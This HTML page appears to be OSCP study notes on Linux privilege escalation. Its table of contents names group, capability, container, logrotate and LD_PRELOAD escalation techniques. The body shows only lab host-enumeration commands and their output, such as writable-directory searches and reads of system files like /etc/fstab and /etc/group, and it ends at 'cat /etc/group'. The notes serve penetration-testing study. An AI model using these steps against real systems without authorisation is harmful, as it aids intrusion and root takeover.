<!doctype html><html lang=en-us dir=ltr itemscope itemtype=http://schema.org/Article data-r-output-format=html><head><meta charset=utf-8><meta name=viewport content="height=device-height,width=device-width,initial-scale=1,minimum-scale=1"><meta name=generator content="Hugo 0.131.0"><meta name=generator content="Relearn 8.2.0"><meta name=description content="File Systems & Additional Drives Introduction to Linux Privilege Escalation
cube111@local[/local]$ lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sda 8:0 0 30G 0 disk â”œâ”€sda1 8:1 0 29G 0 part / â”œâ”€sda2 8:2 0 1K 0 part â””â”€sda5 8:5 0 975M 0 part [SWAP] sr0 11:0 1 848M 0 rom Find Writable Directories Introduction to Linux Privilege Escalation
cube111@local[/local]$ find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null /dmz-backups /tmp /tmp/VMwareDnD /tmp/."><meta name=author content><meta name=twitter:card content="summary"><meta name=twitter:title content="linux privilege escalation :: DrakonOps"><meta name=twitter:description content="File Systems & Additional Drives Introduction to Linux Privilege Escalation
cube111@local[/local]$ lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sda 8:0 0 30G 0 disk â”œâ”€sda1 8:1 0 29G 0 part / â”œâ”€sda2 8:2 0 1K 0 part â””â”€sda5 8:5 0 975M 0 part [SWAP] sr0 11:0 1 848M 0 rom Find Writable Directories Introduction to Linux Privilege Escalation
cube111@local[/local]$ find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null /dmz-backups /tmp /tmp/VMwareDnD /tmp/."><meta property="og:url" content="https://web/oscp-notes/linux-privilege-escalation/index.html"><meta property="og:site_name" content="DrakonOps"><meta property="og:title" content="linux privilege escalation :: DrakonOps"><meta property="og:description" content="File Systems & Additional Drives Introduction to Linux Privilege Escalation
cube111@local[/local]$ lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sda 8:0 0 30G 0 disk â”œâ”€sda1 8:1 0 29G 0 part / â”œâ”€sda2 8:2 0 1K 0 part â””â”€sda5 8:5 0 975M 0 part [SWAP] sr0 11:0 1 848M 0 rom Find Writable Directories Introduction to Linux Privilege Escalation
cube111@local[/local]$ find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null /dmz-backups /tmp /tmp/VMwareDnD /tmp/."><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="OSCP Notes"><meta itemprop=name content="linux privilege escalation :: DrakonOps"><meta itemprop=description content="File Systems & Additional Drives Introduction to Linux Privilege Escalation
cube111@local[/local]$ lsblk NAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINT sda 8:0 0 30G 0 disk â”œâ”€sda1 8:1 0 29G 0 part / â”œâ”€sda2 8:2 0 1K 0 part â””â”€sda5 8:5 0 975M 0 part [SWAP] sr0 11:0 1 848M 0 rom Find Writable Directories Introduction to Linux Privilege Escalation
cube111@local[/local]$ find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null /dmz-backups /tmp /tmp/VMwareDnD /tmp/."><meta itemprop=wordCount content="4331"><title>linux privilege escalation :: DrakonOps</title>
<link href=../../images/logo.png?1762394475 rel=icon type=image/png><link href=../../css/auto-complete/auto-complete.min.css?1762394475 rel=stylesheet><script src=../../js/auto-complete/auto-complete.min.js?1762394475 defer></script><script src=../../js/search-lunr.min.js?1762394475 defer></script><script src=../../js/search.min.js?1762394475 defer></script><script>window.relearn=window.relearn||{},window.relearn.index_js_url="../../searchindex.en.js?1762394475"</script><script src=../../js/lunr/lunr.min.js?1762394475 defer></script><script src=../../js/lunr/lunr.stemmer.support.min.js?1762394475 defer></script><script src=../../js/lunr/lunr.multi.min.js?1762394475 defer></script><script src=../../js/lunr/lunr.en.min.js?1762394475 defer></script><script>window.relearn=window.relearn||{},window.relearn.contentLangs=["en"]</script><link href=../../fonts/fontawesome/css/fontawesome-all.min.css?1762394475 rel=stylesheet media=print onload='this.media="all",this.onload=null'><noscript><link href=../../fonts/fontawesome/css/fontawesome-all.min.css?1762394475 rel=stylesheet></noscript><link href=../../css/perfect-scrollbar/perfect-scrollbar.min.css?1762394475 rel=stylesheet><link href=../../css/theme.min.css?1762394475 rel=stylesheet><link href=../../css/format-html.min.css?1762394475 rel=stylesheet id=R-format-style><script>window.relearn=window.relearn||{},window.relearn.min=`.min`,window.relearn.path="/oscp-notes/linux-privilege-escalation/index.html",window.relearn.relBasePath="../..",window.relearn.relBaseUri="../..",window.relearn.absBaseUri="https://web",window.relearn.disableAnchorCopy=!1,window.relearn.disableAnchorScrolling=!1,window.relearn.disableInlineCopyToClipboard=!1,window.relearn.enableBlockCodeWrap=!0,window.relearn.getItem=(e,t)=>e.getItem(t),window.relearn.setItem=(e,t,n)=>e.setItem(t,n),window.relearn.removeItem=(e,t)=>e.removeItem(t),window.T_Copy_to_clipboard=`Copy to clipboard`,window.T_Copied_to_clipboard=`Copied to clipboard!`,window.T_Copy_link_to_clipboard=`Copy link to clipboard`,window.T_Link_copied_to_clipboard=`Copied link to clipboard!`,window.T_Reset_view=`Reset view`,window.T_View_reset=`View reset!`,window.T_No_results_found=`No results found for "{0}"`,window.T_N_results_found=`{1} results found for "{0}"`,window.relearn.themevariants=["zen-dark"],window.relearn.customvariantname="my-custom-variant",window.relearn.changeVariant=function(e){var t=document.documentElement.dataset.rThemeVariant;window.relearn.setItem(window.localStorage,window.relearn.absBaseUri+"/variant",e),document.documentElement.dataset.rThemeVariant=e,t!=e&&(document.dispatchEvent(new CustomEvent("themeVariantLoaded",{detail:{variant:e,oldVariant:t}})),window.relearn.markVariant())},window.relearn.markVariant=function(){var e=window.relearn.getItem(window.localStorage,window.relearn.absBaseUri+"/variant");document.querySelectorAll(".R-variantswitcher select").forEach(t=>{t.value=e})},window.relearn.initVariant=function(){var e=window.relearn.getItem(window.localStorage,window.relearn.absBaseUri+"/variant")??"";e==window.relearn.customvariantname||(!e||!window.relearn.themevariants.includes(e))&&(e=window.relearn.themevariants[0],window.relearn.setItem(window.localStorage,window.relearn.absBaseUri+"/variant",e)),document.documentElement.dataset.rThemeVariant=e},window.relearn.initVariant(),window.relearn.markVariant()</script><link href=../../css/custom.css?1762394475 rel=stylesheet></head><body class="mobile-support html" data-url=../../oscp-notes/linux-privilege-escalation/index.html><div id=R-body class=default-animation><div id=R-body-overlay></div><nav id=R-topbar><div class=topbar-wrapper><div class=topbar-sidebar-divider></div><div class="topbar-area topbar-area-start" data-area=start><div class="topbar-button topbar-button-sidebar" data-content-empty=disable data-width-s=show data-width-m=hide data-width-l=hide><span class="btn cstyle link noborder notitle interactive"><button onclick=toggleNav() type=button title="Menu (CTRL+ALT+n)"><i class="fa-fw fas fa-bars"></i></button></span></div><div class="topbar-button topbar-button-toc" data-content-empty=hide data-width-s=show data-width-m=show data-width-l=show><span class="btn cstyle link noborder notitle interactive"><button onclick=toggleTopbarFlyout(this) type=button title="Table of Contents (CTRL+ALT+t)"><i class="fa-fw fas fa-list-alt"></i></button></span><div class=topbar-content><div class=topbar-content-wrapper><nav class=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#gaining-situational-awareness>Gaining Situational Awareness</a><ul><li></li></ul></li></ul><ul><li><a href=#ssh-keys>SSH Keys</a></li></ul><ul><li><ul><li><a href=#2-command-substitution>2ï¸âƒ£ <strong>Command Substitution</strong></a></li><li><a href=#3-command-chaining>3ï¸âƒ£ <strong>Command Chaining</strong></a></li><li><a href=#4-environment-variables-abuse>4ï¸âƒ£ <strong>Environment Variables Abuse</strong></a></li><li><a href=#4-environment-variables-abuse-1>4ï¸âƒ£ <strong>Environment Variables Abuse</strong></a></li><li><a href=#5-shell-functions>5ï¸âƒ£ <strong>Shell Functions</strong></a></li></ul></li><li><a href=#summary>Summary</a></li></ul><ul><li><a href=#-concept-explanation>ğŸ” Concept Explanation</a><ul><li><a href=#set-user-id-setuid><strong>Set User ID (setuid)</strong></a></li><li><a href=#set-group-id-setgid><strong>Set Group ID (setgid)</strong></a></li></ul></li><li><a href=#-suid-enumeration-commands>ğŸ’» SUID Enumeration Commands</a><ul><li><a href=#-example-output>ğŸ”¬ Example Output</a></li></ul></li><li><a href=#-sgid-enumeration-commands>ğŸ’» SGID Enumeration Commands</a><ul><li><a href=#-example-output-1>ğŸ”¬ Example Output</a></li></ul></li><li><a href=#-privilege-escalation-via-suidsgid>ğŸ›¡ Privilege Escalation via SUID/SGID</a></li><li><a href=#-gtfobins>ğŸ“Œ GTFOBins</a></li><li><a href=#-gtfobins-sudo-example-apt-get>ğŸ’» GTFOBins Sudo Example (<code>apt-get</code>)</a><ul><li><a href=#-output-example>ğŸ”¬ Output Example</a></li></ul></li><li><a href=#-notes>âš  Notes</a></li></ul><ul><li><a href=#-concept-explanation-1>ğŸ” Concept Explanation</a></li><li><a href=#-group-lxd-linux-containers>ğŸ”§ Group: <code>lxd</code> (Linux Containers)</a><ul><li><a href=#-why-dangerous>ğŸ” Why dangerous</a></li><li><a href=#-exploitation-steps>ğŸ’» Exploitation Steps</a></li></ul></li><li><a href=#-group-docker>ğŸ”§ Group: <code>docker</code></a><ul><li><a href=#-why-dangerous-1>ğŸ” Why dangerous</a></li><li><a href=#-exploitation-example>ğŸ’» Exploitation Example</a></li></ul></li><li><a href=#-group-disk>ğŸ”§ Group: <code>disk</code></a><ul><li><a href=#-why-dangerous-2>ğŸ” Why dangerous</a></li><li><a href=#-exploitation-example-using-debugfs>ğŸ’» Exploitation Example (using debugfs):</a></li></ul></li><li><a href=#-group-adm>ğŸ”§ Group: <code>adm</code></a><ul><li><a href=#-why-dangerous-3>ğŸ” Why dangerous</a></li><li><a href=#-exploitation-example-1>ğŸ’» Exploitation Example</a></li></ul></li><li><a href=#-key-oscp-takeaway>ğŸ” Key OSCP Takeaway</a></li><li><a href=#always-check-group-memberships--lxd-docker-disk-and-adm-may-allow-privilege-escalation-even-without-full-sudo-access>Always check group memberships â€” <code>lxd</code>, <code>docker</code>, <code>disk</code>, and <code>adm</code> may allow privilege escalation even without full sudo access.</a></li></ul><ul><li><a href=#-concept-explanation-2>ğŸ” Concept Explanation</a></li><li><a href=#-setting-capabilities>ğŸ”§ Setting Capabilities</a><ul><li><a href=#command>Command</a></li><li><a href=#syntax-explanation>Syntax Explanation</a></li></ul></li><li><a href=#-common-dangerous-capabilities>ğŸ”§ Common Dangerous Capabilities</a></li><li><a href=#-capability-values>ğŸ”§ Capability Values</a></li><li><a href=#-enumerating-capabilities>ğŸ”§ Enumerating Capabilities</a><ul><li><a href=#search-capabilities-across-common-bin-dirs>Search capabilities across common bin dirs:</a></li><li><a href=#output-example>Output Example:</a></li></ul></li><li><a href=#-exploiting-cap_dac_override>ğŸ”§ Exploiting <code>cap_dac_override</code></a><ul><li><a href=#1-confirm-capability-on-vulnerable-binary>1ï¸âƒ£ Confirm capability on vulnerable binary:</a></li><li><a href=#2-modify-etcpasswd-using-vimbasic>2ï¸âƒ£ Modify <code>/etc/passwd</code> using vim.basic:</a></li><li><a href=#3-modify-root-account-to-remove-password>3ï¸âƒ£ Modify root account to remove password:</a></li><li><a href=#4-verify>4ï¸âƒ£ Verify:</a></li><li><a href=#5-switch-to-root-with-no-password>5ï¸âƒ£ Switch to root with no password:</a></li></ul></li><li><a href=#-oscp-pro-tip>ğŸ›¡ OSCP Pro Tip</a></li></ul><ul><li><a href=#-concept>ğŸ” Concept</a></li><li><a href=#-crontab-syntax-oscp-quick-rule>ğŸ”§ Crontab Syntax (OSCP quick rule)</a></li><li><a href=#-finding-cron-jobs-to-abuse>ğŸ”§ Finding Cron Jobs to Abuse</a><ul><li><a href=#1-search-for-world-writable-files-potential-targets>1ï¸âƒ£ Search for world-writable files (potential targets):</a></li><li><a href=#2-observe-file-timestamps>2ï¸âƒ£ Observe file timestamps</a></li><li><a href=#3-monitor-real-time-cron-activity-using-pspy>3ï¸âƒ£ Monitor real-time cron activity using <code>pspy</code></a></li></ul></li></ul><ul><li><a href=#-what-are-containers>ğŸ” What are containers?</a></li></ul><ul><li><ul><li><a href=#1-find-existing-container-templates>1ï¸âƒ£ Find existing container templates:</a></li><li><a href=#2-import-image>2ï¸âƒ£ Import image:</a></li><li><a href=#3-verify-image-import>3ï¸âƒ£ Verify image import:</a></li><li><a href=#4-initialize-privileged-container>4ï¸âƒ£ Initialize privileged container</a></li><li><a href=#5-mount-host-root-filesystem-inside-container>5ï¸âƒ£ Mount host root filesystem inside container</a></li><li><a href=#6-start-container-1>6ï¸âƒ£ Start container</a></li><li><a href=#7-get-shell-inside-container>7ï¸âƒ£ Get shell inside container</a></li><li><a href=#8-access-host-filesystem-as-root>8ï¸âƒ£ Access host filesystem as root</a></li></ul></li></ul><ul><li><a href=#overview>Overview</a></li><li><a href=#kubernetes-architecture>Kubernetes Architecture</a><ul><li><a href=#control-plane-master-node>Control Plane (Master Node)</a></li><li><a href=#worker-nodes-minions>Worker Nodes (Minions)</a></li></ul></li><li><a href=#key-concepts>Key Concepts</a></li><li><a href=#kubernetes-vs-docker>Kubernetes vs Docker</a></li><li><a href=#kubernetes-api>Kubernetes API</a><ul><li><a href=#authentication>Authentication</a></li><li><a href=#anonymous-access>Anonymous Access</a></li></ul></li><li><a href=#exploiting-logrotate-privilege-escalation>Exploiting Logrotate (Privilege Escalation)</a><ul><li><a href=#conditions-for-exploitation>Conditions for exploitation:</a></li><li><a href=#exploit-logrotten>Exploit: <strong>logrotten</strong></a></li></ul></li><li><a href=#ld_preload-privilege-escalation>LD_PRELOAD Privilege Escalation</a></li></ul></nav></div></div></div></div><ol class="topbar-breadcrumbs breadcrumbs highlightable" itemscope itemtype=http://schema.org/BreadcrumbList><li itemscope itemtype=https://schema.org/ListItem itemprop=itemListElement><a itemprop=item href=../../index.html><span itemprop=name>DrakonOps</span></a><meta itemprop=position content="1">&nbsp;>&nbsp;</li><li itemscope itemtype=https://schema.org/ListItem itemprop=itemListElement><a itemprop=item href=../../oscp-notes/index.html><span itemprop=name>OSCP Notes</span></a><meta itemprop=position content="2">&nbsp;>&nbsp;</li><li itemscope itemtype=https://schema.org/ListItem itemprop=itemListElement><span itemprop=name>linux privilege escalation</span><meta itemprop=position content="3"></li></ol><div class="topbar-area topbar-area-end" data-area=end><div class="topbar-button topbar-button-prev" data-content-empty=disable data-width-s=show data-width-m=show data-width-l=show><span class="btn cstyle link noborder notitle interactive"><a href=../../oscp-notes/privilige-escalation/index.html title="privilige escalation (ğŸ¡)"><i class="fa-fw fas fa-chevron-left"></i></a></span></div><div class="topbar-button topbar-button-next" data-content-empty=disable data-width-s=show data-width-m=show data-width-l=show><span class="btn cstyle link noborder notitle interactive"><a href=../../oscp-notes/windows-privilege-escalation/index.html title="Windows Privilege Escalation (ğŸ¡’)"><i class="fa-fw fas fa-chevron-right"></i></a></span></div><div class="topbar-button topbar-button-more" data-content-empty=hide data-width-s=show data-width-m=show data-width-l=show><span class="btn cstyle link noborder notitle interactive"><button onclick=toggleTopbarFlyout(this) type=button title=More><i class="fa-fw fas fa-ellipsis-v"></i></button></span><div class=topbar-content><div class=topbar-content-wrapper><div class="topbar-area topbar-area-more" data-area=more></div></div></div></div></div></div></nav><div id=R-main-overlay></div><main id=R-body-inner class="highlightable oscp-notes" tabindex=-1><div class=flex-block-wrapper><article class=default><header class=headline></header><h1 id=linux-privilege-escalation>linux privilege escalation</h1><h4 id=file-systems--additional-drives>File Systems & Additional Drives</h4><p>Introduction to Linux Privilege Escalation</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ lsblk
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
</span></span><span style=display:flex><span>sda      8:0    0   30G  0 disk 
</span></span><span style=display:flex><span>â”œâ”€sda1   8:1    0   29G  0 part /
</span></span><span style=display:flex><span>â”œâ”€sda2   8:2    0    1K  0 part 
</span></span><span style=display:flex><span>â””â”€sda5   8:5    0  975M  0 part [SWAP]
</span></span><span style=display:flex><span>sr0     11:0    1  848M  0 rom
</span></span></code></pre></div><p>Â </p><p>Â </p><h4 id=find-writable-directories>Find Writable Directories</h4><p>Introduction to Linux Privilege Escalation</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ find / -path /proc -prune -o -type d -perm -o+w 2&gt;/dev/null
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>/dmz-backups
</span></span><span style=display:flex><span>/tmp
</span></span><span style=display:flex><span>/tmp/VMwareDnD
</span></span><span style=display:flex><span>/tmp/.XIM-unix
</span></span><span style=display:flex><span>/tmp/.Test-unix
</span></span><span style=display:flex><span>/tmp/.X11-unix
</span></span><span style=display:flex><span>/tmp/systemd-private-8a2c51fcbad240d09578916b47b0bb17-systemd-timesyncd.service-TIecv0/tmp
</span></span><span style=display:flex><span>/tmp/.font-unix
</span></span><span style=display:flex><span>/tmp/.ICE-unix
</span></span><span style=display:flex><span>/proc
</span></span><span style=display:flex><span>/dev/mqueue
</span></span><span style=display:flex><span>/dev/shm
</span></span><span style=display:flex><span>/var/tmp
</span></span><span style=display:flex><span>/var/tmp/systemd-private-8a2c51fcbad240d09578916b47b0bb17-systemd-timesyncd.service-hm6Qdl/tmp
</span></span><span style=display:flex><span>/var/crash
</span></span><span style=display:flex><span>/run/lock
</span></span></code></pre></div><p>Â </p><p>Â </p><h4 id=find-writable-directories-1>Find Writable Directories</h4><p>Introduction to Linux Privilege Escalation</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ find / -path /proc -prune -o -type d -perm -o+w 2&gt;/dev/null
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>/dmz-backups
</span></span><span style=display:flex><span>/tmp
</span></span><span style=display:flex><span>/tmp/VMwareDnD
</span></span><span style=display:flex><span>/tmp/.XIM-unix
</span></span><span style=display:flex><span>/tmp/.Test-unix
</span></span><span style=display:flex><span>/tmp/.X11-unix
</span></span><span style=display:flex><span>/tmp/systemd-private-8a2c51fcbad240d09578916b47b0bb17-systemd-timesyncd.service-TIecv0/tmp
</span></span><span style=display:flex><span>/tmp/.font-unix
</span></span><span style=display:flex><span>/tmp/.ICE-unix
</span></span><span style=display:flex><span>/proc
</span></span><span style=display:flex><span>/dev/mqueue
</span></span><span style=display:flex><span>/dev/shm
</span></span><span style=display:flex><span>/var/tmp
</span></span><span style=display:flex><span>/var/tmp/systemd-private-8a2c51fcbad240d09578916b47b0bb17-systemd-timesyncd.service-hm6Qdl/tmp
</span></span><span style=display:flex><span>/var/crash
</span></span><span style=display:flex><span>/run/lock
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>find / -path /mnt -prune -o -type d -writable 2&gt;/dev/null
</span></span></code></pre></div><p>Â </p><p>Â </p><p>Â </p><h2 id=gaining-situational-awareness>Gaining Situational Awareness</h2><p>Â </p><p>Â </p><ul><li><code>whoami</code> - what user are we running as</li><li><code>id</code> - what groups does our user belong to?</li><li><code>hostname</code> - what is the server named, can we gather anything from the naming convention?</li><li><code>ifconfig</code> or <code>ip a</code> - what subnet did we land in, does the host have additional NICs in other subnets?</li><li><code>sudo -l</code> - can our user run anything with sudo (as another user as root) without needing a password? This can sometimes be the easiest win and we can do something like <code>sudo su</code> and drop right into a root shell.</li></ul><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ cat /etc/os-release
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>NAME=&#34;Ubuntu&#34;
</span></span><span style=display:flex><span>VERSION=&#34;20.04.4 LTS (Focal Fossa)&#34;
</span></span><span style=display:flex><span>ID=ubuntu
</span></span><span style=display:flex><span>ID_LIKE=debian
</span></span><span style=display:flex><span>PRETTY_NAME=&#34;Ubuntu 20.04.4 LTS&#34;
</span></span><span style=display:flex><span>VERSION_ID=&#34;20.04&#34;
</span></span><span style=display:flex><span>HOME_URL=&#34;https://www.ubuntu.com/&#34;
</span></span><span style=display:flex><span>SUPPORT_URL=&#34;https://help.ubuntu.com/&#34;
</span></span><span style=display:flex><span>BUG_REPORT_URL=&#34;https://bugs.launchpad.net/ubuntu/&#34;
</span></span><span style=display:flex><span>PRIVACY_POLICY_URL=&#34;https://www.ubuntu.com/legal/terms-and-policies/privacy-policy&#34;
</span></span><span style=display:flex><span>VERSION_CODENAME=focal
</span></span></code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ echo $PATH
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
</span></span></code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ env
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>SHELL=/bin/bash
</span></span><span style=display:flex><span>PWD=/home/local-student
</span></span><span style=display:flex><span>LOGNAME=local-student
</span></span><span style=display:flex><span>XDG_SESSION_TYPE=tty
</span></span><span style=display:flex><span>MOTD_SHOWN=pam
</span></span><span style=display:flex><span>HOME=/home/local-student
</span></span><span style=display:flex><span>LANG=en_US.UTF-8
</span></span></code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>Linux nixlpe02 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
</span></span></code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ lscpu 
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Architecture:                    x86_64
</span></span><span style=display:flex><span>CPU op-mode(s):                  32-bit, 64-bit
</span></span><span style=display:flex><span>Byte Order:                      Little Endian
</span></span><span style=display:flex><span>Address sizes:                   43 bits physical, 48 bits virtual
</span></span><span style=display:flex><span>CPU(s):                          2
</span></span><span style=display:flex><span>On-line CPU(s) list:             0,1
</span></span><span style=display:flex><span>Thread(s) per core:              1
</span></span><span style=display:flex><span>Core(s) per socket:              2
</span></span><span style=display:flex><span>Socket(s):                       1
</span></span><span style=display:flex><span>NUMA node(s):                    1
</span></span><span style=display:flex><span>Vendor ID:                       AuthenticAMD
</span></span><span style=display:flex><span>CPU family:                      23
</span></span><span style=display:flex><span>Model:                           49
</span></span><span style=display:flex><span>Model name:                      AMD EPYC 7302P 16-Core Processor
</span></span><span style=display:flex><span>Stepping:                        0
</span></span><span style=display:flex><span>CPU MHz:                         2994.375
</span></span><span style=display:flex><span>BogoMIPS:                        5988.75
</span></span><span style=display:flex><span>Hypervisor vendor:               VMware
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>&lt;SNIP&gt;
</span></span></code></pre></div><p>Â </p><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ cat /etc/shells
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span># /etc/shells: valid login shells
</span></span><span style=display:flex><span>/bin/sh
</span></span><span style=display:flex><span>/bin/bash
</span></span><span style=display:flex><span>/usr/bin/bash
</span></span><span style=display:flex><span>/bin/rbash
</span></span><span style=display:flex><span>/usr/bin/rbash
</span></span><span style=display:flex><span>/bin/dash
</span></span><span style=display:flex><span>/usr/bin/dash
</span></span><span style=display:flex><span>/usr/bin/tmux
</span></span></code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ lsblk
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>NAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
</span></span><span style=display:flex><span>loop0                       7:0    0   55M  1 loop /snap/core18/1705
</span></span><span style=display:flex><span>loop1                       7:1    0   69M  1 loop /snap/lxd/14804
</span></span><span style=display:flex><span>loop2                       7:2    0   47M  1 loop /snap/snapd/16292
</span></span><span style=display:flex><span>loop3                       7:3    0  103M  1 loop /snap/lxd/23339
</span></span><span style=display:flex><span>loop4                       7:4    0   62M  1 loop /snap/core20/1587
</span></span><span style=display:flex><span>loop5                       7:5    0 55.6M  1 loop /snap/core18/2538
</span></span><span style=display:flex><span>sda                         8:0    0   20G  0 disk 
</span></span><span style=display:flex><span>â”œâ”€sda1                      8:1    0    1M  0 part 
</span></span><span style=display:flex><span>â”œâ”€sda2                      8:2    0    1G  0 part /boot
</span></span><span style=display:flex><span>â””â”€sda3                      8:3    0   19G  0 part 
</span></span><span style=display:flex><span>  â””â”€ubuntu--vg-ubuntu--lv 253:0    0   18G  0 lvm  /
</span></span></code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ cat /etc/fstab
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span># /etc/fstab: static file system information.
</span></span><span style=display:flex><span>#
</span></span><span style=display:flex><span><span style=color:#75715e># Use &#34;blkid&#34; to print the universally unique identifier for a</span>
</span></span><span style=display:flex><span># device; this may be used with UUID<span style=color:#f92672>=</span> as a more robust way to name devices
</span></span><span style=display:flex><span># that works even <span style=color:#66d9ef>if</span> disks are added and removed. See fstab<span style=color:#f92672>(</span>5<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>#
</span></span><span style=display:flex><span><span style=color:#75715e># &lt;file system&gt; &lt;mount point&gt;   &lt;type&gt;  &lt;options&gt;       &lt;dump&gt;  &lt;pass&gt;</span>
</span></span><span style=display:flex><span># / was on /dev/ubuntu-vg/ubuntu-lv during curtin installation
</span></span><span style=display:flex><span>/dev/disk/by-id/dm-uuid-LVM-BdLsBLE4CvzJUgtkugkof4S0dZG7gWR8HCNOlRdLWoXVOba2tYUMzHfFQAP9ajul / ext4 defaults 0 0
</span></span><span style=display:flex><span># /boot was on /dev/sda2 during curtin installation
</span></span></code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ route
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Kernel IP routing table
</span></span><span style=display:flex><span>Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
</span></span><span style=display:flex><span>default         _gateway        0.0.0.0         UG    0      0        0 ens192
</span></span><span style=display:flex><span>10.129.0.0      0.0.0.0         255.255.0.0     U     0      0        0 ens192
</span></span></code></pre></div><p>Â </p><p>Â </p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ cat /etc/group
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
